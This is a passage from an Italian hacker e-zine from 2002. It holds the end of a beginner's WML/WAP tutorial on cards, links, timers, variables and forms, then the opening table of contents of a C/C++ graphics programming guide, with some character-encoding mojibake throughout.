| le altre indicano dove si trova il descrittore del linguaggio che ne     |
| contiene la sintassi. Alcuni terminali richiedono questa dichiarazione   |
| all'inizio del WML, altri no. Meglio comunque specificarlo sempre.       |
|                                                                          |
| COMMENTI                                                                 |
| Si possono inserire nel testo sorgente della pagina WML alcuni           |
| commenti esplicativi proprio come nel HTML. I commenti verranno          |
| ignorati dal microbrowser che non li visualizzerα, possono occupare      |
| una riga intera oppure solo una parte di essa.                           |
|                                                                          |
| <!-- commento -->                                                        |
|                                                                          |
| Non Θ possibile "nidificare" pi∙ commenti, uno dentro l'altro.           |
|                                                                          |
|                                                                          |
|                                                                          |
|  3 >>> FORMATTAZIONE                                                     |
|                                                                          |
| SPAZI                                                                    |
| I caratteri Newline (hex. 10), Carriage Return (hex. 1D), Space (hex.    |
| 20) e Tab (hex. 9) sono tutti considerati indifferente come spazi.       |
|                                                                          |
| TAG "p"                                                                  |
|                                                                          |
| delimita un paragrafo                                                    |
|                                                                          |
| &lt;p [align="left|center|right"]>...&lt;/p>                                   |
|                                                                          |
| left: allinea il testo a sinistra                                        |
| center: allinea il testo al centro                                       |
| right: allinea il testo a destra                                         |
|                                                                          |
| ELEMENTI DI FORMATTAZIONE                                                |
| Θ possibile specificare un tipo particolare di formattazione             |
| racchiudendo il testo tra due tag specifici.                             |
|                                                                          |
| &lt;em>....&lt;/em> testo enfatizzato (italico)                                |
| &lt;strong>....&lt;/strong> testo fortemente enfatizzato (grassetto)           |
| &lt;i>....&lt;/i> testo italico                                                |
| &lt;b>....&lt;/b> testo in grassetto                                           |
| &lt;u>....&lt;/u> testo sottolineato                                           |
| &lt;big>....&lt;/big> testo ingrandito                                         |
| &lt;small>....&lt;/small> testo ridotto                                        |
|                                                                          |
| &lt;p>                                                                      |
|    Questo testo e' in &lt;i>italico&lt;/i>                                     |
|    menre questo e' in &lt;b>grassetto&lt;/b>.                                  |
| &lt;/p>                                                                     |
| TAG "br"                                                                 |
|                                                                          |
| sancisce nel testo l'inizio di una nuova riga.                           |
|                                                                          |
| &lt;br/>                                                                    |
|                                                                          |
| &lt;p>                                                                      |
|    riga1&lt;br/>                                                            |
|    riga2                                                                 |
| &lt;/p>                                                                     |
|  4 >>> PRIMO DECK WML                                                    |
|                                                                          |
| Definiamo il deck che conterrα le varie card della nostra pagina WML,    |
| ed infine definiamo due card. Ecco lo scheletro iniziale della pagina    |
| WML:                                                                     |
|                                                                          |
| <?xml version="1.0"?>                                                    |
| <!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD wml 1.1//EN"                      |
| "http://www.wapforum.org/DTD/wml_1.1.xml">                               |
| &lt;wml>                                                                    |
|                                                                          |
| &lt;card id="home" title="CYBERWORLD.it">                                   |
|                                                                          |
| &lt;/card>                                                                  |
|                                                                          |
| &lt;card id="info" title="CYBERWORLD.it">                                   |
|                                                                          |
| &lt;/card>                                                                  |
|                                                                          |
| &lt;/wml>                                                                   |
| Completiamo il testo contenuto nelle card, assegnando ad ognuna di       |
| esse un nome ed un titolo mediante due attributi. Aprendo il deck        |
| verrα visualizzata la card Home, premendo la soft key indicata, sarα     |
| possibile navigare alla card successiva, info, e da questa tornare       |
| alla precedente.                                                         |
| Di seguito il deck completo:                                             |
|                                                                          |
|                                                                          |
|                                                                          |
| <?xml version="1.0"?>                                                    |
| <!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD wml 1.1//EN"                      |
| "http://www.wapforum.org/DTD/wml_1.1.xml">                               |
| &lt;wml>                                                                    |
|                                                                          |
| &lt;card id="home" title="CYBERWORLD.it">                                   |
|    &lt;p>                                                                   |
|       CYBERWorld.it&lt;br/>                                                 |
|       ...viaggio nel wml...&lt;br/>                                         |
|       &lt;anchor title="Info">Info                                          |
|          &lt;go href="#info"/>                                              |
|       &lt;/anchor>                                                          |
|    &lt;/p>                                                                  |
| &lt;/card>                                                                  |
|                                                                          |
| &lt;card id="info" title="CYBERWORLD.it">                                   |
|    &lt;p>                                                                   |
|       Benvenuto nel sito WAP di CYBERDUDE.it&lt;br/>                        |
|       &lt;anchor title="Home">Home&lt;br/>                                     |
|          &lt;go href="#home"/>                                              |
|       &lt;/anchor>                                                          |
|    &lt;/p>                                                                  |
| &lt;/card>                                                                  |
|                                                                          |
| &lt;/wml>                                                                   |
|                                                                          |
|                                                                          |
| E questa eÆ un poÆ la spiegazione di quello che ne viene fuori           |
|                                                                          |
| card 1 (home). Premendo il link Info si passerα alla seconda card.       |
|                                                                          |
| card 2 (info). Premendo il link Home si ritornerα alla prima card        |
|                                                                          |
| N.B.                                                                     |
|                                                                          |
| In un deck WML si possono avere pi∙ card e quindi pi∙ titoli.            |
|                                                                          |
|                                                                          |
|                                                                          |
| CARD                                                                     |
| Come definire una card in un deck WML? La sintassi generale del          |
| tag "card" Θ la seguente:                                                |
|                                                                          |
| &lt;card id="Nome_card" [title="titolo_da_visualizzare"]                    |
| [onenterforward="url"] [onenterbackward="url"] [ontimer="url"]           |
| >...&lt;/card>                                                              |
|                                                                          |
| -          ID >> Definisce il nome della card, indispensabile per        |
|                  poterla richiamare. Deve essere unico all'interno del   |
|                  deck e composto da una sola parola                      |
|                                                                          |
| -          TITLE >> Definisce il titolo della card, se non Θ             |
|                     indispensabile meglio non utilizzarlo perchΘ         |
|                     comunque occupa una riga del giα piccolo display.    |
|                                                                          |
| -          ONENTERFORWARD >> Quando un utente accede con il              |
|                              metodo 'goÆ viene automaticamente           |
|                              rediretto proprio verso quel URL            |
|                                                                          |
| -          ONENTERBACKWARD >>Quando un utente riaccede con il            |
|                              tasto 'back' viene automaticamente          |
|                              rediretto proprio verso quel URL            |
|                                                                          |
| -          ONTIMER >> redirigere l'utente alla pagina specificata come   |
|                       URL in questo attributo allo scadere di un timer   |
|                       di inattivitα.                                     |
|                                                                          |
|                                                                          |
|                                                                          |
|  5 >>> IL TAG "DO"                                                       |
|                                                                          |
| Consente di specificazione un'azione da svolgere nella card corrente.    |
| Pu≥ essere un bottone grafico sul display del telefonino, un tasto       |
| funzione o speciale sulla tastiera, un comando ad attivazione vocale,    |
| etc.                                                                     |
|                                                                          |
| &lt;do type="azione" label="etichetta" name="nome">                         |
| go|refresh|prev|noop                                                     |
| &lt;/do>                                                                    |
|                                                                          |
| -          TYPE >> Indica læazione da eseguire. Alcune sono:             |
|                                                                          |
|                 ╖  type="accept", esegue il contenuto del tag            |
|                                                                          |
|                 ╖  type="prev ", torna all'ultima pagina visitata        |
|                                                                          |
|                 ╖ type="reset", resetta il contesto del browser          |
|                                                                          |
|                 ╖ type="unknow", non specifica alcuna azione             |
|                                                                          |
|                                                                          |
|                                                                          |
| -          LABEL >> Specifica l'etichetta di testo da associare alla     |
|                     soft-key, meglio non superare i 6 caratteri          |
|                                                                          |
| -          NAME >> Definisce l'identificativo del tag. Nella stessa      |
|                    card, non Φ possibile avere pi∙ di un tag "do" con    |
|                    lo stesso nome.                                       |
|                                                                          |
|                                                                          |
|                                                                          |
| All'interno dell'elemento "do" Θ possibile specificare una delle         |
| seguenti azioni :                                                        |
|                                                                          |
| go                                                                       |
| prev                                                                     |
| refresh                                                                  |
| noop                                                                     |
| TAG AZIONE "go"                                                          |
| Specificare lÆ URL a cui saltare quando si seleziona quella soft-key.    |
|                                                                          |
| &lt;go href="url">                                                          |
| &lt;setvar nome="nome_variabile" value="valore_da_assegnare"/>              |
| &lt;/go>                                                                    |
|                                                                          |
| href >> url a cui puntare                                                |
|                                                                          |
| TAG AZIONE "prev"                                                        |
| Indirizza la navigazione all'ultima card visitata                        |
|                                                                          |
| &lt;prev>                                                                   |
| &lt;setvar nome="nome_variabile" value="valore_da_assegnare"/>              |
| &lt;/prev>                                                                  |
|                                                                          |
| Per assegnare alla soft-key 'back' il ritorno alla card precedente:      |
|                                                                          |
| &lt;do type="accept" label="Back">                                          |
|    &lt;prev/>                                                               |
| &lt;/do>                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
| TAG AZIONE "refresh"                                                     |
| Forza il ricaricamento della card                                        |
|                                                                          |
| &lt;refresh>                                                                |
| &lt;setvar nome="nome_variabile" value="valore_da_assegnare"/>              |
| &lt;/refresh>                                                               |
|                                                                          |
| &lt;do type="accept" label="Reload">                                        |
|    &lt;refresh/>                                                            |
| &lt;/do>                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
| TAG AZIONE "noop"                                                        |
|                                                                          |
| Indica che non deve essere eseguita alcuna azione                        |
|                                                                          |
| &lt;noop/>                                                                  |
|                                                                          |
|                                                                          |
|                                                                          |
|  6 >>> LINK e COLLEGAMENTI                                               |
|                                                                          |
| Per inserire un link nella propria pagina Θ necessario prima definire    |
| un'anchor con il tag "anchor" che crea il pulsante attivabile.           |
|                                                                          |
| &lt;anchor title="titolo">...&lt;/anchor>                                      |
|                                                                          |
| &lt;go href="url"/>                                                         |
|                                                                          |
| &lt;anchor>                                                                 |
|    Go to card 2                                                          |
|    &lt;go href="#card2"/>                                                   |
| &lt;/anchor>                                                                |
|                                                                          |
| All'interno del tag "go" Θ poi possibile specificare anche il tag        |
| setvar per cambiare il valore di una o pi∙ variabili nella card di       |
| destinazione                                                             |
|                                                                          |
| &lt;setvar nome="nome_variabile" value="valore_da_assegnare"/>              |
|                                                                          |
| &lt;wml>                                                                    |
|                                                                          |
| &lt;card id="card1" title="Link e anchor">                                  |
|    &lt;p>                                                                   |
|       &lt;anchor title="go_card2">Link to card2!                            |
|          &lt;go href="card2.wml"/>                                          |
|       &lt;/anchor>                                                          |
|    &lt;/p>                                                                  |
|    &lt;p>                                                                   |
|       &lt;anchor title="prev">Back!                                         |
|          &lt;prev/>                                                         |
|       &lt;/anchor>                                                          |
|    &lt;/p>                                                                  |
| &lt;/card>                                                                  |
|                                                                          |
| &lt;/wml>                                                                   |
|                                                                          |
|                                                                          |
|                                                                          |
|  7 >>> TEMPLATE e TIMER                                                  |
|                                                                          |
|                                                                          |
|                                                                          |
| TEMPLATE                                                                 |
| E' possibile definire e specificare un metodo sia singolarmente per      |
| ogni card sia globalmente condivisibile per tutte le card presenti nel   |
| deck risparmiando cos∞ di copiare lo stesso codice in pi∙ parti del      |
| deck.                                                                    |
| Supponiamo di voler disporre in tutte le card del deck di un             |
| pulsante "indietro" che rimandi indietro all'ultima card visitata,       |
| ecco come potremmo definire il TEMPLATE:                                 |
|                                                                          |
| &lt;template>                                                               |
|    &lt;do type="prev" name="back" label="Back">                             |
|       &lt;prev/>                                                            |
|    &lt;/do>                                                                 |
| &lt;/template>                                                              |
| Ma la possibilitα di tornare indietro (back) su una lista di card        |
| concatenate ha senso solo dalla seconda in poi, come fare allora per     |
| eliminare il tasto Back dalla prima? Sarebbe sufficiente specificare     |
| un'azione "noop" corrispondente alla softkey "back"                      |
| Nell'esempio che segue viene definito un TEMPLATE per il tasto 'Back'.   |
| La "card2" avrα quindi la soft-key 'Back' presente, mentre la "card1"    |
| no poichΘ il metodo 'Back' Θ sovrascritto nella card utilizzando il      |
| tag "noop".                                                              |
|                                                                          |
| &lt;wml>                                                                    |
| &lt;template>                                                               |
|    &lt;do type="prev" name="Back" label="Back">                             |
|       &lt;prev/>                                                            |
|    &lt;/do>                                                                 |
| &lt;/template>                                                              |
| &lt;card id="card1">                                                        |
|    &lt;do type="prev" name="Back">                                          |
|       &lt;noop/>                                                            |
|    &lt;/do>                                                                 |
|    ...                                                                   |
| &lt;/card>                                                                  |
| &lt;card id="card2">                                                        |
|    ...                                                                   |
| &lt;/card>                                                                  |
| &lt;wml>                                                                    |
|                                                                          |
| TIMER                                                                    |
| permette di gestire i momenti di inattivitα. Quando si entra in una      |
| card il timer viene inizializzato, se l'utente non Θ ancora "uscito"     |
| dalla card al momento del suo scadere viene scatenata l'azione           |
| preimpostata e specificata nell'attributo "ontimer" della card stessa.   |
| I timer sono indicati in decimi di secondo ed Θ possibile specificare    |
| al massimo un timer per ciascuna card.                                   |
|                                                                          |
| &lt;timer name="nome_timer" value="valore"/>                                |
|                                                                          |
|                                                                          |
|                                                                          |
| -          NAME >> Specifica il nome di una variabile contenente il      |
|                    valore in decimi di secondo del timer. Usciti dalla   |
|                    card, questa variabile conterrα lÆeventuale tempo     |
|                    residuo; zero se il timer Θ scaduto, un valore        |
|                    positivo se l'utente Θ uscito volontariamente dalla   |
|                    card prima dello scadere del timer.                   |
|                                                                          |
| -          VALORE >> Valore di default del timer in decimi di secondo.   |
|                      Se Θ specificata la variabile in "name" e questa Θ  | 
|                      giα settata con un certo valore, allora verrα       |
|                      utilizzato proprio quel valore per il timer,        |
|                      ignorando il valore di default qui indicato.        |
|                      Obbligatorio                                        |
|                                                                          |
| Nell'esempio seguente si visualizza per 1 secondo il titolo del sito     |
| per poi passare al deck home.wml:                                        |
|                                                                          |
| &lt;wml>                                                                    |
| &lt;card id="splash" ontimer="home.wml" title="CYBERWORLD.it">              |
|    &lt;timer value="10"/>                                                   |
|    &lt;p align="center">                                                    |
|       CYBERWORLD.it&lt;br/>                                                 |
|       Viaggio nel mondo del WML                                          |
|    &lt;/p>                                                                  |
| &lt;/card>                                                                  |
| &lt;/wml>                                                                   |
|                                                                          |
|  8 >>> LE IMMAGINI IN WML                                                |
| Il WML prevede utilizzo uno specifico tipo di immagine, con un formato   |
| particolarmente "leggero" in termini di occupazione di memoria, il       |
| WBMP (Wireless BitMap) , una versione a 1 bit (bianco e nero) del        |
| formato BMP. Tutte le immagini per essere compatibili con le             |
| specifiche e quindi visualizzabili devono quindi essere convertite in    |
| WBMP e non devono superare le dimensioni di 150x150 pixel o comunque     |
| 1461 pixel complessivi.                                                  |
|                                                                          |
| Per visualizzare un'immagine si ricorre al tag "img":                    |
|                                                                          |
| &lt;img src="percorso" alt="descrizione" [vspace="xx"] [hspace="yy"]        |
| [align="top|middle|bottom"] [height="aa"]                                |
| [width="bb"]/>                                                           |
|                                                                          |
|                                                                          |
| -          SRC >> Specifica l'indirizzo URL dell'immagine. Obbligatorio  |
|                                                                          |
| -          ALT >> Descrizione dell'immagine. Viene visualizzata al       |
|                   posto dell'immagine in caso di problemi. Obbligatorio  |
|                                                                          |
| -          VSPACE >> Specifica in pixel o percentuale lo spazio da       |
|                      lasciare vuoto DESTRA O SINISTRA                    |
|                                                                          |
| -          HSPACE >> Specifica in pixel o percentuale lo spazio da       |
|                      lasciare vuoto SOPRA SOTTO                          |
|                                                                          |
| -          ALIGN >> Indica l'allineamento verticale dell'immagine:       |
|                     top, testo allineato al lato superiore               |
|                     dell'immagine; bottom in basso e middle al centro.   |
|                     Opzionale.                                           |
|                                                                          |
| -          HEIGHT  HIDTH>> Specificano altezza (height) e larghezza      |
|                            (width) dell'immagine. I valori possono       |
|                            essere espressi in pixel o in percentuale,    |
|                            con la caratteristica che il valore           |
|                            percentuale NON si riferisce alle dimensioni  | 
|                            dell'immagine bens∞ allo spazio disponibile   |
|                            in cui inserirla. Opzionale.                  |
|                                                                          |
| Attenzione percheÆ il Web server deve inviare lÆimmagine specificando    |
| il corretto tipo MIME:                                                   |
| image/vnd.wap.wbmp                                                       |
|                                                                          |
|  9 >>> LE VARIABILI                                                      |
|                                                                          |
| Le variabili possono avere un nome qualsiasi composto da una sequenza    |
| di lettere, numeri e caratteri '_' (underscore), purchΘ inizi con il     |
| carattere '$'. Se quindi volete utilizzare questo carattere nel testo    |
| della vostra pagina WML, dovrete dire al micro-browser che non           |
| intendete referenziare una variabile utilizzando la doppia               |
| sintassi '$$'.                                                           |
|                                                                          |
| Questo Θ il carattere $$                                                 |
|                                                                          |
| verrα visualizzato cos∞:                                                 |
|                                                                          |
| Questo Θ il carattere $                                                  |
|                                                                          |
| Fate attenzione che il WML Θ sensibile alle maiuscole/minuscole,         |
| quindi $cyberdude e $Cyberdude non referenziano la stessa variabile,     |
| ma bens∞ due diverse. Una variabile pu≥ essere settata attraverso il     |
| tag "setvar":                                                            |
|                                                                          |
| &lt;setvar nome="nome_variabile" value="valore_da_assegnare"/>              |
|                                                                          |
| Nell'esempio seguente la variabile $var1 pu≥ essere settata al           |
| valore "Buongiorno!" oppure cancellata premendo rispettivamente la       |
| soft-key etichettata "Set" o "Clear".                                    |
|                                                                          |
| &lt;wml>                                                                    |
| &lt;card id="home" title="CYBERWORLD.it">                                   |
|    &lt;p>                                                                   |
|       Variabile:&lt;br/>                                                    |
|       $var1                                                              |
|       &lt;do type="accept" label="Set">                                     |
|          &lt;go href="variables.wml">                                       |
|             &lt;setvar name="var1"  value="Buongiorno!"/>                   |
|          &lt;/go>                                                           |
|       &lt;/do>                                                              |
|       &lt;do type="accept" label="Clear">                                   |
|          &lt;go href="variables.wml">                                       |
|             &lt;setvar name="var1"  value=""/>                              |
|          &lt;/go>                                                           |
|       &lt;/do>                                                              |
|    &lt;/p>                                                                  |
| &lt;/card>                                                                  |
| &lt;/wml>                                                                   |
|                                                                          |
| -                 Premendo "Set" la variabile $var viene settata al      |
|                   valore "Buongiorno!".                                  |
| -                 Premendo "Clear" invece il valore viene cancellato     |
|                                                                          |
|  10 >>> DECK: UN ESEMPIO COMPLETO                                        |
|                                                                          |
| Il deck Θ composto da 3 card. Inizialmente definiamo un template,        |
| valido per tutte le card, che attiva la soft-key 'Back' per navigare     |
| all'indietro sulle card. La prima card, "splash", visualizza il logo     |
| del sito. Premendo il link "continua" oppure entro 5 secondi se          |
| l'utente non compie alcuna azione, si viene trasferiti alla card "home". | 
|                                                                          |
|                                                                          |
| &lt;wml>                                                                    |
| &lt;template>                                                               |
|         &lt;do type="prev" name="Back" label="Back">                        |
|         &lt;prev/>                                                          |
|         &lt;/do>                                                            |
| &lt;/template>                                                              |
|                                                                          |
| &lt;card id="splash" ontimer="#home" title="CYBERWORLD.it">                 |
|         &lt;timer value="50"/>                                              |
|         &lt;do type="prev" name="Back">                                     |
|            &lt;noop/>                                                       |
|         &lt;/do>                                                            |
|         &lt;p align="center">                                               |
|            &lt;img src = "cyberdude.wbmp" alt = "CYBERWORLD.it"/>&lt;br/>      |
|                Viaggio nel mondo del WML&lt;br/>                            |
|                &lt;anchor title="Home">Continua&lt;br/>                        |
|                        &lt;go href="#home"/>                                |
|                &lt;/anchor>                                                 |
|         &lt;/p>                                                             |
| &lt;/card>                                                                  |
|                                                                          |
| &lt;card id="home" title="CYBERWORLD.it">                                   |
|         &lt;p>                                                              |
|         Menu:&lt;br/>                                                       |
|         &lt;anchor title="Asp">Asp                                          |
|                &lt;go href="Asp.wml"/>                                      |
|         &lt;/anchor>                                                        |
|         &lt;br/>                                                            |
|         &lt;anchor title="hacking">hacking                                  |
|                &lt;go href="hacking.wml"/>                                  |
|         &lt;/anchor>                                                        |
|         &lt;br/>                                                            |
|         &lt;anchor title="Info">Info                                        |
|                &lt;go href="#info"/>                                        |
|         &lt;/anchor>                                                        |
|   &lt;/p>                                                                   |
| &lt;/card>                                                                  |
|                                                                          |
| &lt;card id="info" title="CYBERWORLD.it">                                   |
|         &lt;p>                                                              |
|    Benvenuto nel sito WAP sperimentale di CYBERDUDE&lt;br/>                 |
|    In caso di problemi contattate via email: cyberdude.h4ck3r@libero.it  |
|    &lt;br/>&lt;br/>                                                            |
|         &lt;anchor title="Home">Home&lt;br/>                                   |
|                &lt;go href="#home"/>                                        |
|         &lt;/anchor>                                                        |
|         &lt;/p>                                                             |
| &lt;/card>                                                                  |
| &lt;/wml>                                                                   |
|                                                                          |
|  11 >>> FORM INPUT DELL'UTENTE. Parte 1                                  |
| Il WML prevede la possibilitα di gestire degli input provenienti da      |
| scelte inserite dall'utente.                                             |
| Tag &lt;input>                                                              |
| Simile all'HTML. L'utente pu≥ inserire il testo attraverso la tastiera   |
| del telefonino.                                                          |
| &lt;input name="nome" [value="valore"] [type="password|text"]               |
| [emptyok="true|false"] [size="num"] [length="num"]>                      |
|                                                                          |
| -                 NAME >> Nome della variabile che verrα settata con     |
|                           il contenuto inserito dall'utente.             |
|                           Obbligatorio                                   |
| -                 VALUE >> Valore di default del campo. Nel caso in      |
|                            cui la variabile specificata in name          |
|                            contenga giα un valore, lÆattributo value     |
|                            viene ignorato.                               |
| -                 TYPE >> Indica il campo Θ una password oppure un       |
|                           normale testo. Nel primo caso allÆatto della   |
|                           digitazione il testo verrα sostituito con      |
|                           degli asterischi.                              |
| -                 EMPTYOK >> Settato a 'TRUE' accetta in input stringe   |
|                              vuote.                                      |
| -                 SIZE >> Dimensione, in numero di caratteri,            |
|                           dellÆarea di input.                            |
| -                 MAXLENGHT >> Numero massimo di caratteri digitabili.   |
| -                 FORMAT >> specifica una maschera di input. E           |
|                             possibile indicare il tipo di carattere per  |
|                             ciascuna posizione della stringa.            |
|                                                                          |
| A qualsiasi carattere alfabetico maiuscolo o di punteggiatura            |
| a qualsiasi carattere alfabetico minuscolo o di punteggiatura            |
| N qualsiasi carattere numerico                                           |
| X qualsiasi carattere maiuscolo                                          |
| x qualsiasi carattere minuscolo                                          |
| M qualsiasi carattere                                                    |
| m qualsiasi carattere                                                    |
| *f qualsiasi numero di caratteri del formato f, dove f Φ uno dei         |
| suddetti formati                                                         |
| nf un numero n di caratteri del formato f, dove f Φ uno dei suddetti     |
| formati e n Φ un numero intero da 1 a 9                                  |
|                                                                          |
|                                                                          |
| Quindi ricapitoliamo la situazione :                                     |
|                                                                          |
| Si vuole richiedere un campo di testo di al massimo 32 caratteri         |
| alfanumerici:                                                            |
|                                                                          |
| &lt;input name="nome" type="text" maxlength="32"/>                          |
|                                                                          |
| Lo stesso del caso precedente, ma con valore di default pari             |
| a "Marcello":                                                            |
|                                                                          |
| &lt;input name="nome" type="text" value="Marcello" maxlength="32"/>         |
|                                                                          |
| Oppure un numero di due cifre:                                           |
|                                                                          |
| &lt;input name="eta" type="text" format="NN"/>                              |
|                                                                          |
| Ed infine un campo particolare, tre caratteri alfabetici maiuscoli,      |
| quindi due cifre numeriche pi∙ un numero non precisato di caratteri      |
| alfabetici generici:                                                     |
|                                                                          |
| &lt;input name="specific" type="text" format="XXXNN*m"/>                    |
|                                                                          |
| Tag "postfield"                                                          |
|                                                                          |
| Non viene mostrato sullo schermo. Pu≥ essere usato per postare un        |
| coppia nome/valore al server. E' molto pi∙ potente di un campo           |
| nascosto, perchΘ grazie al modo in cui vengono gestite le variabili in   |
| WML, potete collezionare informazioni contestuali e quindi passarle al   |
| server tutte insieme.                                                    |
|                                                                          |
| UN ESEMPIO COMPLETO DI FORM                                              |
|                                                                          |
| &lt;card id="send_email" title="Invia email">                               |
|    &lt;p>                                                                   |
|    A:&lt;br/>                                                               |
|    &lt;input type="text" format="*M" emptyok="false"                        |
|       name="To" size="10" maxlength="40"/>                               |
|    Oggetto:&lt;br/>                                                         |
|    &lt;input type="text" format="*M" emptyok="false"                        |
|       name="Subject" size="10" maxlength="100"/>                         |
|    Messaggio:&lt;br/>                                                       |
|    &lt;input type="text" format="*M" emptyok="false"                        |
|       name="Body" size="10" maxlength="40"/>                             |
|    Signature:&lt;br/>                                                       |
|    &lt;select name="Signature">                                             |
|       &lt;option value="yes">yes&lt;/option>                                   |
|       &lt;option value="no">no&lt;/option>                                     |
|    &lt;/select>                                                             |
|    &lt;anchor title="Invia">Invia                                           |
|       &lt;go href="send_mail.wml">                                          |
|          &lt;postfield name="To" value="$(To)" />                           |
|          &lt;postfield name="Subject" value="$(Subject)" />                 |
|          &lt;postfield name="Body" value="$(Body)" />                       |
|          &lt;postfield name="Signature" value="$(Signature)" />             |
|       &lt;/go>                                                              |
|    &lt;/anchor>                                                             |
|    &lt;/p>                                                                  |
| &lt;/card>                                                                  |
|                                                                          |
|  12 >>> FORM INPUT DELL'UTENTE. Parte 2                                  |
|                                                                          |
| Tag "select"                                                             |
|                                                                          |
| Il tag "select" consente all'utente di selezionare un'opzione da una     |
| lista di possibili scelte, ognuna delle quali specificata da un          |
| elemento "option".                                                       |
|                                                                          |
| &lt;select name="nome" [multiple="true|false"] [value="valore"]             |
| [iname="var_name"] [ivalue="var_valore"]>                                |
| ...                                                                      |
| &lt;select>                                                                 |
|                                                                          |
| -          NAME >> Nome della variabile che verrα settata con il         |
|                    contenuto inserito dall'utente. Obbligatorio          |
|                                                                          |
| -          MULTIPLE >> Abilita la scelta multipla. Il default per        |
|                        questa opzione Θ false.                           |
|                                                                          |
| -          VALUE >> Valore di default. Nel caso in cui la variabile      |
|                     specificata in "name" contenga giα un valore,        |
|                     lÆattributo "value" viene ignorato. In caso di       |
|                     scelta multipla, conterrα i vari elementi            |
|                     selezionati separati da punto e virgola.             |
|                                                                          |
| -          INAME >> Nome della variabile nella quale Φ contenuto         |
|                     l'indice di default. Il valore 1 indica la prima     |
|                     option; 0 invece nessuna option selezionata.         |
|                                                                          |
| -          IVALUE >> Indica l'indice (numero posizionbale della          |
|                      option) di default. Il valore 1 indica la prima     |
|                      option; 0 invece nessuna option selezionata.        |
|                                                                          |
| Tag "option"                                                             |
|                                                                          |
| Con questo tag possiamo popolare la nostra lista di opzioni.             |
|                                                                          |
| &lt;option [valore="valore"] [onpick="URL"]>                                |
| ...                                                                      |
| &lt;option>                                                                 |
|                                                                          |
| -          VALORE >> Valore da assegnare alla variabile indicata         |
|                      nell'attributo name della "select" nel caso in cui  | 
|                      l'opzione venga selezionata                         |
|                                                                          |
| -          ONPICK >> Con onpick Φ possibile specificare un URL al        |
|                      quale saltare quando viene selezionata questa       |
|                      opzione.                                            |
|                                                                          |
| &lt;wml>                                                                    |
|    &lt;card>                                                                |
|       &lt;p>                                                                |
|       Seleziona le tue competenze:                                       |
|       &lt;select name="HOBHIES" iname="H" ivalue="1;2" multiple="true">     |
|          &lt;option value="A">Programmazione&lt;/option>                       |
|          &lt;option value="B">Grafica&lt;/option>                              |
|          &lt;option value="C">Satellitare&lt;/option>                          |
|       &lt;/select>                                                          |
|       &lt;/p>                                                               |
|    &lt;/card>                                                               |
| &lt;/wml>                                                                   |
|                                                                          |
| >>> CONCLUSIONI                                                          |
|                                                                          |
| Benissimo ragazzi siamo giunti alla fine di unÆaltro tutorial, che       |
| dire, se lÆavete letto con attenzione vi saraÆ sembrato molto semplice   |
| e credetemi, lo eÆ!!! hihihihhi adesso vi lascio al vostro               |
| divertimento ora tocca lavorare alla vostra fantasia per realizzare      |
| splendidi siti WAP. Ciao a tutti                                         |
|                                                                          |
| Cyberdude  >>> www.area91.da.ru >>> cyberdudemail@libero.it              |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ C0DiNG                                     #08 - 01/11/2002 |
| GUiDA ALLA PR0GRAMMAZi0NE GRAFiCA iN C/C++             [bondo] 0x0E/0x1A |
+--------------------------------------------------------------------------+
| -----------------------------------------------------------------------  |
|                                                                          |
|                                guida alla                                |
|                                                                          |
|                                                                          |
|                   P  R  O  G  R  A  M  M  A  Z  I  O  N  E               |
|                                                                          |
|                            G  R  A  F  I  C  A                           |
|                                                                          |
|                                                                          |
|                                 in C/C++                                 |
|                                                                          |
|                                    by                                    |
|                                                                          |
|                                 b o n d o                                |
|                                                                          |
| ----------------------------------------------------------------------   |
|                                                                          |
|      1. PRELiMiNARi                                                      |
|      2. ASSEMBLER RUNS BETTER                                            |
|      3. LA MODALiTA' GRAFiCA                                             |
|      4. COLORi                                                           |
|      5. PiXEL                                                            |
|      6. DiSEGNAMO!                                                       |
|      7. SiNCRONiZZAZiONE                                                 |
|      8. DOPPiO BUFFERiNG                                                 |
|      9. SPRiTE                                                           |
|     10. SPRiTE iN TRASPARENZA                                            |
|     11. SPRiTE FUORi SCHERMO                                             |
|     12. iMMAGiNi                                                         |
|     13. STAMPA AUTOMATiZZATA Di SPRiTE                                   |
|     14. CONCLUSiONi                                                      |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   PRELiMiNARi                                                  |
|  | 1    |-------------------------------------------------------------   |
|  '------'                                                                |
|                                                                          |
| Innanzitutto, questa  non Φ  una guida  sulla programmazione  in C:  Φ   |
| necessaria una  conoscenza -  diciamo  pure  basilare -   per capire e   |
| mettere in pratica  i pochi concetti spiegati qui.                       |
| Non Φ  nemmeno una guida  sulla creazione  di videogiochi, quindi  non   |
| troverete grafica  3D, textures,  rendering, colonne  sonore, joystick   |
| e  via  discorrendo.  Non Φ  da   considerarsi  nemmeno una   'bibbia'   |
| sull'argomento, in  quanto  'errare umanum est'...                       |
| E' un documento che, inizialmente, ho scritto  per uso personale e poi   |
| ho deciso di ampliare  e condividere  con voi  tutti:   probabilmente,   |
| alcuni  aspetti   non  saranno  approfonditi,  alcuni  mancheranno del   |
| tutto...                                                                 |
| Questa guida Φ stata  scritta mano a mano  che sperimentavo e scrivevo   |
| le  varie  funzioni:  ho   presentato  tutte  le   soluzioni   che  ho   |
| implementato, con   successive modifiche,  i ragionamenti  che ci sono   |
| dietro perchΦ  credo sia  pi∙ formativo   che presentare  solamente il   |
| codice finito e commentato.                                              |
| Non lapidatemi se non capite: ho qualche problema con l'italiano...      |
| Non arrabbiatevi se non funziona al primo colpo: perseverate...          |
| Attenzione: la guida fa  riferimento  al compilatore C/C++  DJGPP. Non   |
| per  questo  dovete  per  forza  utilizzare   questo  compilatore,  ma   |
| alcuni  stralci di  codice fanno  uso di variabili e funzioni  proprie   |
| di questo strumento... i concetti  sono quelli per tutti, se  usate un   |
| compilatore diverso stα a voi rielaborarli...                            |
| Ho deciso di  utilizzare il DJGPP  primo perchΦ Φ  gratuito e  secondo   |
| perchΦ il compilatore   borland  da'  tutta  una  serie  di   problemi   |
| che  non   star≥  qui  a elencare.  Mi sento  di consigliare  anche il   |
| Watcom C/C++ come compilatore - anche questo free.                       |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   ASSEMBLER RUNS BETTER                                        |
